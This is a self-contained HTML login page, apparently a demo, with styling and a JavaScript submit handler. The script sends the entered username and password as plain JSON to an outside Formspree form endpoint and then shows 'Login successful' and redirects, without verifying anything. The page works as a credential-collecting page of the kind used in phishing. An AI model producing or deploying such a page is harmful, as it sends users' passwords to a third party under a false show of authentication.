<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Login Page</title>
<style>
  /* Basic styling for demo */
  body {
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    background: #121212;
    color: #eee;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
  }
  .login-container {
    background: #1e1e1e;
    padding: 2rem;
    border-radius: 8px;
    width: 300px;
    box-shadow: 0 0 15px rgba(0, 255, 255, 0.2);
  }
  h2 {
    text-align: center;
    margin-bottom: 1.5rem;
  }
  input[type="text"], input[type="password"] {
    width: 100%;
    padding: 0.6rem;
    margin-bottom: 1rem;
    border: none;
    border-radius: 4px;
  }
  button {
    width: 100%;
    padding: 0.6rem;
    border: none;
    border-radius: 4px;
    background: #00ffff;
    color: #121212;
    font-weight: bold;
    cursor: pointer;
    transition: background 0.3s ease;
  }
  button:hover {
    background: #00cccc;
  }
  #errorMsg {
    color: #ff5555;
    text-align: center;
    margin-top: 0.5rem;
    min-height: 1.2rem;
  }
</style>
</head>
<body>

<div class="login-container">
  <h2>Login</h2>
  <form id="loginForm" action="https://formspree.io/f/meogbqer" method="POST">
    <input type="text" name="username" placeholder="Username" required />
    <input type="password" name="password" placeholder="Password" required />
    <button type="submit">Login</button>
    <div id="errorMsg"></div>
  </form>
</div>

<script>
  const form = document.getElementById('loginForm');
  const errorMsg = document.getElementById('errorMsg');

  form.addEventListener('submit', async (e) => {
    e.preventDefault();
    
    const username = form.username.value.trim();
    const password = form.password.value;

    if (!username || !password) {
      errorMsg.textContent = 'Fill all fields, bro.';
      return;
    }
    
    // Optionally, you can do more validation here (regex, length, etc.)

    // Send form data manually to Formspree using fetch API
    const res = await fetch(form.action, {
      method: 'POST',
      headers: {'Accept': 'application/json', 'Content-Type': 'application/json'},
      body: JSON.stringify({username, password})
    });

    if (res.ok) {
      errorMsg.style.color = '#0f0';
      errorMsg.textContent = 'Login successful! Redirecting...';
      setTimeout(() => window.location.href = '/dashboard.html', 1500); // Simulated redirect
    } else {
      errorMsg.style.color = '#ff5555';
      errorMsg.textContent = 'Login failed. Try again.';
    }
  });
</script>

</body>
</html>
